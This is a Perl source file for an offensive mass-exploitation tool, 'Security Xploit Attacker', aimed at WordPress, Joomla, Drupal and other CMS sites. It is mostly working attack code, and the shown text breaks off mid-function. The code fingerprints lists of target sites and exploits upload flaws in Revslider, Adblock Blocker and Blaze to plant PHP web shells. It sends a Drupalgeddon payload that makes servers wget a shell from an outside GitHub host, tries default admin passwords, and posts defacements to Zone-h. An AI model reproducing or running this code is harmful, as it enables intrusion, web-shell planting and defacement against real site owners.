use if $^O eq "MSWin32", Win32::Console::ANSI;
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
main:;
system("title DISCLAMER");
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print "\n              	    ";
print colored("                  (DISCLAIMER)\n\n",'red');
print "                  ";
print "[";
print colored("!",'red');
print "] Usage of";
print colored" Security Xploit Attacker",'red';
print " for attacking ";
print "[";
print colored ("!",'red');
print "]\n";
print "              	    "; 
print " targets without prior mutual consient is illagal.\n";
print "              	    ";
print "      It is the end User's Responsibility\n";
print "              	    ";
print "         To Obey All Applicable Local, \n";
print "              	    ";
print "            State And Federal Laws.\n";
print "              	    ";
print " Developers Assume no Liability and Not Responsible\n";
print "              	    ";
print "   For Any Issue or Damage Coused By This Program. \n\n";

print color('bold red'),"[";
print color('bold green'),"1";
print color('bold red'),"] ";
print color("bold white"),"Ok\n";
print color("bold white"),"Choose Number : ";
my $item = <STDIN>;
chomp $item;

if($item eq '1')
{
main();
}
else {
goto main;
};
system("title Security Xploit Attacker v2.5");
$au = LWP::UserAgent->new();
$au->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$au->timeout(10);
sub main(){
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold green');
my $datetime    = localtime;
@months = qw(01 02 03 04 05 06 07 08 09 10 11 12);
($second, $minute, $hour, $dayOfMonth, $month, $yearOffset, $dayOfWeek, $dayOfYear, $daylightSavings) = localtime();
$year = 1900 + $yearOffset;
$month = "$months[$month]";
$banner="           
                      .                                                      .
                    .n                   .                 .                  n.
              .   .dP                  dP                   9b                 9b.    .
             4    qXb         .       dX                     Xb       .        dXp     t
            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
                                   8b.     .dbodP'89b.odb.     .d8
                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
                                         9XXXXXX(___)XXXXXXP      
                                        xXXXXX X.'v'.X XXXXXx
                                            XXXbb   ddXXX
                                           x.X         X.x
                                          b'             'd      

";
print $banner;
print color('reset');
print "                      	            ";
print colored("[+]",'green on_blue');
print colored("Security Xploit Xploit v1.0",'red on_cyan');
print colored("[+]\n",'green on_blue');
print "              	                         ";
print colored("[+]",'green on_blue'); 
print colored ("Coded By Ph.hitachi",'white on_red');
print colored("[+]\n",'green on_blue');
print "              	                 ";
print colored("[+]",'green on_blue');
print colored ("Start At $datetime",'white on_cyan'),"";
print colored("[+]\n\n",'green on_blue');
print color('reset');
print "                      	           	 ";
print colored("You Have List Of Sites ?\n\n",'cyan on_red');
print "                      	           	      ";
print colored("Choose a number\n\n",'cyan on_red');
print color("green" ), "\t[";print color("white"),"01";print color("green"),"]";print color("blue"),"Yes\n";
print color("green" ), "\t[";print color("white"),"02";print color("green"),"]";print color("red"),"No\n";
print color("green" ), "\t[";print color("white"),"03";print color("green"),"]";print color("yellow"),"SQL injection scanner\n";
print color("green" ), "\t[";print color("white"),"04";print color("green"),"]";print color("green"),"Get dorks\n";
print color("green" ), "\t[";print color("white"),"05";print color("green"),"]";print color("blue"),"Local file inclusion [Auto inject]\n";
print color("green" ), "\t[";print color("white"),"06";print color("green"),"]";print color("red"),"WordPress Brute Force\n",;
print color("green" ), "\t[";print color("white"),"07";print color("green"),"]";print color("yellow"),"FTP Scanner\n",;
print color("green" ), "\t[";print color("white"),"08";print color("green"),"]";print color("green"),"Admin Page Finder\n",;
print color("green" ), "\t[";print color("white"),"09";print color("green"),"]";print color("blue"),"Exploit WordPress only\n";
print color("green" ), "\t[";print color("white"),"10";print color("green"),"]";print color("red"),"Exploit Drupal only\n";
print color("green" ), "\t[";print color("white"),"11";print color("green"),"]";print color("red"),"Exploit Joomla only\n";
print color("green" ), "\t[";print color("white"),"12";print color("green"),"]";print color("yellow"),"Shells Finder [ WSO Shell ]\n";
print color("green" ), "\t[";print color("white"),"13";print color("green"),"]";print color("blue"),"Shells Scanner [ WebShells Found ]\n";
print color("green" ), "\t[";print color("white"),"14";print color("green"),"]";print color("blue"),"Exploit OpenCart only\n";
print color("green" ), "\t[";print color("white"),"15";print color("green"),"]";print color("red"),"IP Generator\n";
print color("green" ), "\t[";print color("white"),"16";print color("green"),"]";print color("yellow"),"Grab Site[ Dorking ]\n";
print color("green" ), "\t[";print color("white"),"17";print color("green"),"]";print color("blue"),"List Sites to IP\n";
print color("green" ), "\t[";print color("white"),"18";print color("green"),"]";print color("blue"),"Reverse IP [ Get site from IP ]\n";
print color("green" ), "\t[";print color("white"),"19";print color("green"),"]";print color("red"),"DDos Attack\n";
print color("green" ), "\t[";print color("white"),"20";print color("green"),"]";print color("red"),"Brute Force\n";
print color("green" ), "\t[";print color("white"),"21";print color("green"),"]";print color("red"),"Zone-h [poster]\n";
print color("green" ), "\t[";print color("white"),"22";print color("green"),"]";print color("red"),"Exit\n";
print color("green" ), "\t>";print color("white"),">";print color("green"),">";
print color ('reset');

$item=<STDIN>;
chomp $item;
}
if($item eq '1')
{
print color('bold red'),"  [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color("bold white"),"Enter your websites list : ";
$list=<STDIN>;
chomp $list;
}
if($item eq '2')
{
system("dork.pl");
}
$cms="CMS";
    if (-e $cms){
    }else{
        mkdir $cms or die "Error creating directory: $cms";
    }
$rez="Result";
    if (-e $rez){
  }else{
        mkdir $rez or die "Error creating directory: $rez";
    }
if($item eq '3' )
{
system("sqli.py");
}
if($item eq '4')
{
getdork();
}if($item eq '5'){
system("lfi.pl");
}if($item eq '6'){
system("wpbrute.pl");
}if($item eq '7'){
system("ftp_scanner.py");
}if($item eq '8'){
system("admin.py");
}if($item eq '9'){
scanwordpress();
}if($item eq '10'){
scandrupal();
}if($item eq '11'){
scanjoomla();
}if($item eq '12'){
shellscan();
}if($item eq '13'){
shellfound();
}if($item eq '14'){
scanopencart();
}if($item eq '15'){
ipgen();
}if($item eq '16'){
grabsitedork();
}if($item eq '17'){
listtoip();
}if($item eq '18'){
revip();
}if($item eq '19'){
system("DDos.pl")
}if($item eq '20'){
system ("BFv1.pl -l brute.txt -p pass.txt");
}if ($item eq '21'){
system("zone.pl");
}if ($item eq '22'){
print color ("red")," Good Bye";
exit;
}
$a = 0;
open (SITE, "<$list") || die "[-] Can't open the list websites file";
@SITE = <SITE>;
close SITE;
$link=$#TARGETS + 1;

print color("bold white"), "[+] Total sites : ";
print color("bold red"), "".scalar(@SITE)."\n\n\n";
print color('reset');

OUTER: foreach $site(@SITE){
chomp($site);
$a++;
cmsdetector();
}
###################### CMS Detector ######################
sub cmsdetector(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$cmsX = $site . '/admin';
my $cms = $ua->get("$cmsX")->content;
$lokomedia = "$site/smiley/1.gif";
my $lokomedia1 = $ua->get("$lokomedia")->content_type;
$loko = "$site/rss.xml";
my $lokomedia2 = $ua->get("$loko")->content;
my $content = $ua->get("$site")->content;
if($content =~/wp-content|wordpress|xmlrpc.php|wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"), "WordPress\n";
print color('reset');
open(TEXT, '>>CMS/joomla.txt');
print TEXT "$site\n";   
close(TEXT);
wpinstallcheck();
revslider();
addblockblocker();
blaze();
catpro();
cherry();
downloadsmanager();
formcraft();
levoslideshow();
powerzoomer();
gravityforms();
getconfig();
getconfig2();
showbiz();
ads();
slideshowpro();
wpmobiledetector();
wysija();
inboundiomarketing();
dzszoomsounds();
reflexgallery();
sexycontactform();
sexycontactform2();
simpleplugin();
wtffu();
phpeventcalendar();
synoptic();
Wpshop();
wpinjetc();
gravityy();
acento();
ajaxstore();
Antioch();
Authentic();
Churchope();
Epic();
Felis();
Force();
FR0();
hbaudio();
History();
Imageex();
kbslider();
Linenity();
Lote27();
Markant();
MichaelCanthony();
mTheme();
NativeChurch();
Parallelus();
RedSteel();
Revsliderss();
S3bubble();
SMWF();
TheLoft();
Trinity();
Urbancity();
Yakimabait();
Membership();
FileManagerwp();
Googlemp3();
Justifiedim();
Justified2();
Justified3();
Aspose();
Asposedoc();
MiwoFTP();
MiwoFTP2();
miniaudioplayer();
Ypotheme();
Media14();
wpmon();
mapprolbs();
}
elsif($content =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"), "Joomla\n";
print color('reset'); 
open(TEXT, '>>CMS/Joomla.txt');
print TEXT "$site\n"; 
close(TEXT);
comjdownloads();
comjdownloadsdef();
comfabrik();
comfabrikdef();
comfabrik2();
comfabrikdef2();
hdflvplayer();
comadsmanager();
comblog();
comusers();
comweblinks();
com_content();
mod_simplefileupload();
com_search();
com_admin1();
com_admin2();
com_content1();
com_content2();
com_weblinks();
com_mailto();
com_content3();
com_content4();
com_users();
com_installer();
com_search1();
com_poll();
com_banners();
com_mailto1();
com_a6mambocredits();
com_a6mambohelpdesk();
com_advancedpoll();
com_akocomment();
com_articles();
com_artlinks();
com_trade();
com_bayesiannaivefilter();
com_babackup();
redmy();
facile();
sujks();
rocks();
genesissimple();
developertools();
artuploader();
fancys();
hwdvideoshare();
ksadvertiser();
osproperty();
collector();
NovaSFH();
Jimtawl();
Proclaim();
fox2();
b22j();
b2j();
comjce();
comedia();
}elsif($content =~/Drupal|drupal|sites\/all|drupal.org/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"),"DruPal\n\n";
print color('reset');
open(TEXT, '>>CMS/Drupal.txt');
print TEXT "$site\n";   
close(TEXT);
drupal();
drupalgeddon();
}elsif($content =~/Prestashop|prestashop/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"), "Prestashop\n\n";
print color('reset');
open(TEXT, '>>CMS/Prestashop.txt');
print TEXT "$site\n";   
close(TEXT);
columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
}elsif($cms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print color('bold white'),"[-] $site";	
print color("bold green"), " - Magento\n\n";print color('reset');
open(TEXT, '>>sites/Magento.txt');
print TEXT "$site\n";
close(TEXT);
magento();
}
elsif($content =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
print color('bold white'),"[-] $site";	
print color("bold white"), " - OpenCart\n\n";print color('reset');
open(TEXT, '>>sites/vbulletin.txt');
print TEXT "$site\n";
close(TEXT);
opencart();
}elsif($content =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/){
print color('bold white'),"[-] $site";	
print color("bold green"), " - vBulletin\n\n";print color('reset');
open(TEXT, '>>sites/vbulletin.txt');
print TEXT "$site\n";
close(TEXT);
opencart();
}elsif($lokomedia1 =~/image\/gif/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"), "Lokomedia\n\n";
print color('reset');
open(TEXT, '>>CMS/lokomedia.txt');
print TEXT "$site\n";   
close(TEXT);
lokomedia();
}elsif($lokomedia2 =~/lokomedia/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"), "Lokomedia\n\n";
print color('reset');
open(TEXT, '>>CMS/lokomedia.txt');
print TEXT "$site\n";   
close(TEXT);
lokomedia();
}else{
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";
print color("bold green"), "Unknown\n\n"; 
open(TEXT, '>>CMS/Unknown.txt');
print color('reset'); 
print TEXT "$site\n";   
close(TEXT);
}
}
#  _____                         _ 
# |  __ \                       | |
# | |  | |_ __ _   _ _ __   __ _| |
# | |  | | '__| | | | '_ \ / _` | |
# | |__| | |  | |_| | |_) | (_| | |
# |_____/|_|   \__,_| .__/ \__,_|_|
#                   | |            
#                   |_|     
       
################ Drupal  Exploit #####################

sub Drupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Drupal  ........................... ";

# check the link of the exploit or you can download script from here : https://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://localhots/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
$admin ="admin";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(TEXT, '>>Result/bruteDrup.txt');
    print TEXT "[Drupal] $site/user/login | username : admin | pass: admin\n";
    close(TEXT);
    }
    elsif ($stat =~ /404/){

    print color('bold red');
print  "NOT VULN\n";
    print color('reset');
    }
}else{

    print color('bold red');
print  "NOT VULN\n";
    print color('reset');
        }

}
sub drupalgeddon{
my $url = "$site/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
$ajax = "_drupa_ajax";
$mail = "mail[#post_render][]";
$mailt= "mail[#type]";
$mailm = "mail[#markup]";
$wget = "wget https://raw.githubusercontent.com/PhHitachi/SecurityXploit/master/Xploit.php -0 Xploit.php ";
$response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [form_id => 'user_register_form', $ajax => '1', $mail => 'exec', $mailt => 'markup', $mailm => $wget]);

if ($response =~ /200/){
print item(),"Drupalgeddon";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/Xploit.php?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$site/Xploit.php?X=Xploit\n";
close (TEXT);
}else{
print item(),"Drupalgeddon";
print color('bold white')," ...................... ";
print color('bold red'),"NOt VULN\n\n";
}
}
#  __  __                        _        
# |  \/  |                      | |       
# | \  / | __ _  __ _  ___ _ __ | |_ ___  
# | |\/| |/ _` |/ _` |/ _ \ '_ \| __/ _ \ 
# | |  | | (_| | (_| |  __/ | | | || (_) |
# |_|  |_|\__,_|\__, |\___|_| |_|\__\___/ 
#                __/ |                    
#               |___/        
             
################ Magento Exploit #####################

sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);


print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Magento ........................... ";
############## script available on google  ################
$magentoxlink = "http://site.com/magento.php";
my $exploit = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploit")->content;
if($checkksbir =~/Success/) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(TEXT, '>>Result/BruteMag.txt');
    print TEXT "[Magento] $site hydra|hydra77\n";
    close(TEXT);
    }
else{

    print color('bold red');
print  "NOT VULN\n";
    print color('reset');


        }

}


################ Wordpress Exploits #####################
#                 ______            
#                |  ____|           
# __      ___ __ | |__  __  ___ __  
# \ \ /\ / / '_ \|  __| \ \/ / '_ \ 
#  \ V  V /| |_) | |____ >  <| |_) |
#   \_/\_/ | .__/|______/_/\_\ .__/ 
#          | |               | |    
#          |_|               |_|    
#########################################################

############### Revshell  ####################
sub revslider(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Shell ................... ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["Xploitrevs.rar"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($check =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Uploading Shell ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');

    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
	$def = "$site/ph.hitachi.html";
	zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($avada =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
    	$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($striking_r =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($IncredibleWP =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($ultimatum =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($medicate =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($centum =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($beach_apollo =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($cuckootap =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($pindol =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";

    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($designplus =~/X Xploit/) {

   print color('bold yellow');
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($rarebird =~/X Xploit/) {

   print color('bold yellow');
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');
    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php")->content;
if($andre =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Uploading Shell] ................... ";
    print color('reset');
   print color('bold green');
print "[Success]\n";
    print color('reset');    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Xploit.php\n";
    close(TEXT); 
		$def = "$site/ph.hitachi.html";
	zoneh();

}
else { }
} else {
    print color('bold red');
print  "NOT VULN\n";
    print color('reset');
}
}

################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["Xploit.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/Xploit.php";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," ................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $addblockup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$addblockup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Adblock Blocker";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";}
}

################ Blaze #####################  
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~/\/uploads\/blaze\/(.*?)\/big\/Xploit.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/Xploit.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," ............................. ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $blazeup\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Blaze";
print color('bold white')," ............................. ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

################ Job_Manager #####################

 sub mods(){
 
my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$files="Xploit.gif";
$jdup= $site . '/jm-ajax/upload_file';
$checkgif= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/Xploit.gif";
$checkgif2= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/Xploit.gif";

my $exploit = $gh->post("$jdup", Content_Type => "multipart/form-data", Content => [  company_logo=>["$files"]  ]);
my $check = $gh->get("$checkgif")->status_line;
if($check =~/200/) {
my $check1 = $gh->get("$checkgif2")->content_type;
if($check1 =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Job Manager";
print color('bold white')," ....................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color("bold white"),("[Upload Successfully] ==> $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/Xploit.gif\n");
print color 'reset';                 
        open (TEXT, '>>Result/uploaded.txt');
		print TEXT "[LINK] => $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/Xploit.gif\n";
        close (TEXT);
}
}
else
{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";


print color('bold white'),"Job Manager";
print color('bold white')," ....................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

################ gravity deface #####################
sub gravityy(){
chomp($_);
$site = $_;
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
